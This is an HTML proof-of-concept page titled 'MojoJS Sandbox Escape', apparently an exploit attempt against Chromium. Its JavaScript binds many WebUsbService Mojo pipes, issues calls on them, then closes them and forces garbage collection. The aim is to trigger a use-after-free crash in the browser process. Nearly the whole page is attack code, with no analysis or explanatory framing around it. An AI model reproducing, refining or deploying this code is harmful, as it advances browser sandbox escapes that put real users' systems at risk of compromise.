<!DOCTYPE html>
<html>
<head>
    <title>MojoJS Sandbox Escape</title>
    <script src="gen/mojo/public/js/bindings.js"></script>
</head>
<body>
    <h1>MojoJS 2Auditor</h1>
    <script type="module">
        import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';

        async function triggerExploit() {
            if (typeof Mojo === 'undefined') {
                console.error("[-] MojoJS not found.");
                return;
            }

            console.log("[*] Analyzing Mojo Handle Structure...");
            let services = [];
            
            for(let i = 0; i < 50; i++) {
                // 1. Manually create the pipe to ensure we have raw handles
                let pipe = Mojo.createMessagePipe();
                let handleForBrowser = pipe.handle0;
                let handleForJS = pipe.handle1;

                // 2. Bind the Browser end
                Mojo.bindInterface(WebUsbService.$interfaceName, handleForBrowser);

                // 3. Bind the JS end to our Remote
                let remote = new WebUsbServiceRemote();
                
                // We use the most reliable way to attach a handle to a remote in ES6
                if (remote.$ && typeof remote.$.bindHandle === 'function') {
                    remote.$.bindHandle(handleForJS);
                } else if (typeof remote.bindHandle === 'function') {
                    remote.bindHandle(handleForJS);
                } else {
                    // Final fallback: use the internal connection object
                    remote.$.connection.bindHandle(handleForJS);
                }

                services.push(remote);
            }

            console.log("[+] Bound 50 pipes. Testing async calls...");
            
            for(let s of services) {
                try {
                    s.getDevices(); 
                } catch(e) {
                    console.log("[-] Call failed, trying internal pointer...");
                    // Some versions require calling through the internal router
                    s.$.getDevices();
                }
            }

            await new Promise(r => setTimeout(r, 1)); 

            console.log("[!] TRIGGERING FREE...");
            for(let s of services) {
                s.$.close();
            }

            if (window.gc) { window.gc(); }
            console.log("[?] Done. Check for Browser crash.");
        }

        triggerExploit();
    </script>
</body>
</html>
